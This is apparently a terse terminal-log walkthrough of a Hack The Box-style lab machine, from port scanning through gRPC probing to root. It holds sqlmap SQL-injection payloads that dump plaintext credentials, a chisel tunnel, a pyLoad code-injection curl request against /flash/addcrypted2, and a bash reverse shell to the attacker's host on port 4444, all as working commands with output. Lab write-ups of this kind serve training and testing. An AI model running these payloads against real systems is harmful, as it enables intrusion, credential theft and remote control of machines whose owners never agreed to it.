```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.11.214 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.214:22
Open 10.10.11.214:50051
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 17:18 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:18
Completed Parallel DNS resolution of 1 host. at 17:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:18
Scanning 10.10.11.214 [2 ports]
Discovered open port 22/tcp on 10.10.11.214
Discovered open port 50051/tcp on 10.10.11.214
Completed Connect Scan at 17:18, 0.18s elapsed (2 total ports)
Initiating Service scan at 17:18
Scanning 2 services on 10.10.11.214
Completed Service scan at 17:18, 16.76s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.214.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 5.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.42s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.17s latency).
Scanned at 2023-07-25 17:18:23 EDT for 23s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=7/25%Time=64C03C26%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.44 seconds

https://grpc.io/blog/wireshark/

https://github.com/fullstorydev/grpcui

┌──(root㉿kali)-[~/go/bin]
└─# go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
go: downloading github.com/fullstorydev/grpcui v1.3.1
go: downloading github.com/fullstorydev/grpcurl v1.8.6
go: downloading github.com/jhump/protoreflect v1.12.0
go: downloading github.com/pkg/browser v0.0.0-20180916011732-0a3d74bf9ce4
go: downloading golang.org/x/crypto v0.0.0-20200622213623-75b288015ac9
go: downloading google.golang.org/grpc v1.45.0-dev.0.20220218222403-011544f72939
go: downloading github.com/golang/protobuf v1.5.2
go: downloading google.golang.org/protobuf v1.28.0
go: downloading golang.org/x/sys v0.0.0-20220406163625-3f8b81556e12
go: downloading golang.org/x/net v0.0.0-20200822124328-c89045814202
go: downloading github.com/envoyproxy/go-control-plane v0.9.10-0.20210907150352-cf90f659a021
go: downloading google.golang.org/genproto v0.0.0-20200526211855-cb27e3aa2013
go: downloading github.com/cespare/xxhash/v2 v2.1.1
go: downloading github.com/cncf/udpa/go v0.0.0-20210930031921-04548b0d99d4
go: downloading github.com/cncf/xds/go v0.0.0-20211011173535-cb28da3451f1
go: downloading github.com/envoyproxy/protoc-gen-validate v0.1.0
go: downloading golang.org/x/oauth2 v0.0.0-20200107190931-bf48bf16ab8d
go: downloading github.com/census-instrumentation/opencensus-proto v0.2.1
go: downloading cloud.google.com/go v0.56.0
                                                                              
┌──(root㉿kali)-[~/go/bin]
└─# ls
dalfox  grpcui

┌──(root㉿kali)-[~/go/bin]
└─# ./grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:34933/

http://127.0.0.1:34933/

method name: LoginUser

admin:admin
we get a response

{
  "message": "Your id is 766."
}

and a
token	b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTAzMzE3NjB9.grNisJmrAmLz5079LXRPv9qtYag-xVKMRtpOtAbkPsY'

now method getInfo

using burp to intercept

response

HTTP/1.1 200 OK

Content-Type: application/json

Date: Tue, 25 Jul 2023 21:59:17 GMT

Content-Length: 401

Connection: close



{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Will update soon."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}

┌──(root㉿kali)-[/home/witty]
└─# cat pc.req     
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:34933
Content-Length: 193
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="104"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: J-16WlxpFL5KpF3Tu7N2ZRGGHFC0vvNWCmaP4iTUrKc
sec-ch-ua-platform: "Linux"
Origin: http://127.0.0.1:34933
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:34933/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=J-16WlxpFL5KpF3Tu7N2ZRGGHFC0vvNWCmaP4iTUrKc
Connection: close

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTAzMzIxMDJ9.-YI-D_qiZlE5glc4YA0iltkJSBHwnNCdSwczeYL6oJM"}],"data":[{"id":"137"}]}

┌──(root㉿kali)-[/home/witty]
└─# sqlmap -r pc.req --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:58:26 /2023-07-25/

[17:58:26] [INFO] parsing HTTP request from 'pc.req'
JSON data found in POST body. Do you want to process it? [Y/n/q] y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] n
[17:58:33] [INFO] testing connection to the target URL
[17:58:33] [INFO] testing if the target URL content is stable
[17:58:33] [INFO] target URL content is stable
[17:58:33] [INFO] testing if (custom) POST parameter 'JSON name' is dynamic
[17:58:33] [INFO] (custom) POST parameter 'JSON name' appears to be dynamic
[17:58:34] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON name' might not be injectable
[17:58:34] [INFO] testing for SQL injection on (custom) POST parameter 'JSON name'
[17:58:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:58:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:58:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:58:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:58:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:58:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:58:40] [INFO] testing 'Generic inline queries'
[17:58:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:58:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:58:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:58:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:58:45] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:58:46] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:58:47] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[17:59:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:59:10] [WARNING] (custom) POST parameter 'JSON name' does not seem to be injectable
[17:59:10] [INFO] testing if (custom) POST parameter 'JSON value' is dynamic
[17:59:10] [INFO] (custom) POST parameter 'JSON value' appears to be dynamic
[17:59:10] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON value' might not be injectable
[17:59:10] [INFO] testing for SQL injection on (custom) POST parameter 'JSON value'
[17:59:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:59:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:59:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:59:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:59:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:59:16] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:59:17] [INFO] testing 'Generic inline queries'
[17:59:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:59:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:59:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:59:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:59:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:59:21] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:59:23] [INFO] testing 'Oracle AND time-based blind'
[17:59:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:59:24] [WARNING] (custom) POST parameter 'JSON value' does not seem to be injectable
[17:59:24] [INFO] testing if (custom) POST parameter 'JSON id' is dynamic
[17:59:24] [INFO] (custom) POST parameter 'JSON id' appears to be dynamic
[17:59:25] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON id' might not be injectable
[17:59:25] [INFO] testing for SQL injection on (custom) POST parameter 'JSON id'
[17:59:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:59:26] [INFO] (custom) POST parameter 'JSON id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[17:59:31] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (1) and risk (1) values? [Y/n] Y
[17:59:47] [INFO] testing 'Generic inline queries'
[17:59:47] [INFO] testing 'SQLite inline queries'
[17:59:47] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[17:59:47] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[17:59:48] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[17:59:53] [INFO] (custom) POST parameter 'JSON id' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[17:59:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:59:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:59:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:59:55] [INFO] target URL appears to have 1 column in query
[17:59:55] [INFO] (custom) POST parameter 'JSON id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 197 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTAzMzIxMDJ9.-YI-D_qiZlE5glc4YA0iltkJSBHwnNCdSwczeYL6oJM"}],"data":[{"id":"137 AND 9499=9499"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTAzMzIxMDJ9.-YI-D_qiZlE5glc4YA0iltkJSBHwnNCdSwczeYL6oJM"}],"data":[{"id":"137 AND 1433=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTAzMzIxMDJ9.-YI-D_qiZlE5glc4YA0iltkJSBHwnNCdSwczeYL6oJM"}],"data":[{"id":"-7739 UNION ALL SELECT CHAR(113,112,98,98,113)||CHAR(120,99,76,89,109,75,80,83,84,87,116,106,86,122,85,103,87,76,117,115,66,70,121,77,105,76,114,115,121,79,104,67,90,99,88,108,90,115,66,100)||CHAR(113,120,113,113,113)-- xELR"}]}
---
[17:59:59] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[17:59:59] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:00:00] [INFO] fetching columns for table 'messages' 
[18:00:00] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+

[18:00:00] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'
[18:00:00] [INFO] fetching columns for table 'accounts' 
[18:00:00] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[18:00:00] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/root/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[18:00:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 18:00:00 /2023-07-25/

┌──(root㉿kali)-[/home/witty]
└─# ssh sau@10.10.11.214   
The authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.
sau@10.10.11.214's password: 
Last login: Tue Jul 25 21:19:01 2023 from 10.10.15.92
-bash-5.0$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
-bash-5.0$ ls
user.txt
-bash-5.0$ cat user.txt
d4e953c116eb4c883462aab1f8f52428

-bash-5.0$ netstat -ntpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

port 8000

┌──(root㉿kali)-[/home/witty]
└─# chisel server -p 1337 --reverse
2023/07/25 18:02:35 server: Reverse tunnelling enabled
2023/07/25 18:02:35 server: Fingerprint AORCBFiQgql2oFU8aSNbZLOJpVVPG/HQaWUP7Xg8Wsw=
2023/07/25 18:02:35 server: Listening on http://0.0.0.0:1337

-bash-5.0$ cd /tmp
-bash-5.0$ ls
bash.sh
pwnd
pyLoad
snap-private-tmp
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-ModemManager.service-XmIXwf
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-fwupd.service-JdX8Ih
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-systemd-logind.service-FM9KJh
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-systemd-resolved.service-LWVY2i
tmpnck05e3i
vmware-root_730-2999460803

┌──(root㉿kali)-[/home/witty/Downloads]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.214 - - [25/Jul/2023 18:04:54] "GET /chisel HTTP/1.1" 200 -

-bash-5.0$ wget http://10.10.14.19/chisel
--2023-07-25 22:04:58--  http://10.10.14.19/chisel
Connecting to 10.10.14.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: ‘chisel’

chisel                         100%[=================================================>]   8.34M   329KB/s    in 16s     

2023-07-25 22:05:14 (519 KB/s) - ‘chisel’ saved [8750072/8750072]

-bash-5.0$ chmod +x chisel
-bash-5.0$ ./chisel client 10.10.14.19:1337 R:8000:127.0.0.1:8000/tcp
2023/07/25 22:05:53 client: Connecting to ws://10.10.14.19:1337
2023/07/25 22:05:54 client: Connected (Latency 174.167176ms)

┌──(root㉿kali)-[/home/witty]
└─# chisel server -p 1337 --reverse
2023/07/25 18:02:35 server: Reverse tunnelling enabled
2023/07/25 18:02:35 server: Fingerprint AORCBFiQgql2oFU8aSNbZLOJpVVPG/HQaWUP7Xg8Wsw=
2023/07/25 18:02:35 server: Listening on http://0.0.0.0:1337
2023/07/25 18:05:51 server: session#1: tun: proxy#R:8000=>8000: Listening

then go http://localhost:8000

https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/


┌──(witty㉿kali)-[~]
└─$ cat bash.sh               
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.19/4444 0>&1

-bash-5.0$ cd /tmp
-bash-5.0$ ls
bash.sh
chisel
pwnd
pyLoad
snap-private-tmp
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-ModemManager.service-XmIXwf
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-fwupd.service-JdX8Ih
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-systemd-logind.service-FM9KJh
systemd-private-f783ede0395c4b7c964b006bda5a4fcc-systemd-resolved.service-LWVY2i
tmpnck05e3i
vmware-root_730-2999460803
-bash-5.0$ nano bash.sh
-bash-5.0$ cat bash.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.19/4444 0>&1

curl -i -s -k -X $'POST' \  
--data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \  
$'http://127.0.0.1:8000/flash/addcrypted2'

-bash-5.0$ curl -i -s -k -X $'POST' \
>     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
>     $'http://127.0.0.1:8000/flash/addcrypted2'

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.214] 60112
bash: cannot set terminal process group (1064): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# ls
ls
db.version
pyload.db
root@pc:~/.pyload/data# cat pyload.db
cat pyload.db
 QLite fa��at 3@    .?�
 y
  X
   	a��7viewpstatspstatsCREATE VIEW "pstats" AS         SELECT p.id AS id, SUM(l.size) AS sizetotal, COUNT(l.id) AS linkstotal, linksdone, sizedone        FROM packages p JOIN links l ON p.id = l.package LEFT OUTER JOIN        (SELECT p.id AS id, COUNT(*) AS linksdone, SUM(l.size) AS sizedone         FROM packages p JOIN links l ON p.id = l.package AND l.status in (0,4,13) GROUP BY p.id) s ON s.id = p.id         GROUP BY p.idF!cindexp_id_indexlinksCREATE INDEX "p_id_index" ON links(package)��ableusersusersCREATE TABLE "users" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "name" TEXT NOT NULL, "email" TEXT DEFAULT "" NOT NULL, "password" TEXT NOT NULL, "role" INTEGER DEFAULT 0 NOT NULL, "permission" INTEGER DEFAULT 0 NOT NULL, "template" TEXT DEFAULT "default" NOT NULL)�$tablestoragestorageCREATE TABLE "storage" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "identifier" TEXT NOT NULL, "key" TEXT NOT NULL, "value" TEXT DEFAULT "")��etablelinkslinksCREATE TABLE "links" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "url" TEXT NOT NULL, "name" TEXT, "size" INTEGER DEFAULT 0 NOT NULL, "status" INTEGER DEFAULT 3 NOT NULL, "plugin" TEXT DEFAULT "DefaultPlugin" NOT NULL, "error" TEXT DEFAULT "", "linkorder" INTEGER DEFAULT 0 NOT NULL, "package" INTEGER DEFAULT 0 NOT NULL, FOREIGN KEY(package) REFERENCES packages(id))P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��]tablepackagespackagesCREATE TABLE "packages" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "name" TEXT NOT NULL, "folder" TEXT, "password" TEXT DEFAULT "", "site" TEXT DEFAULT "", "queue" INTEGER DEFAULT 0 N QLite fa��at 3@    .?�
 y
  X
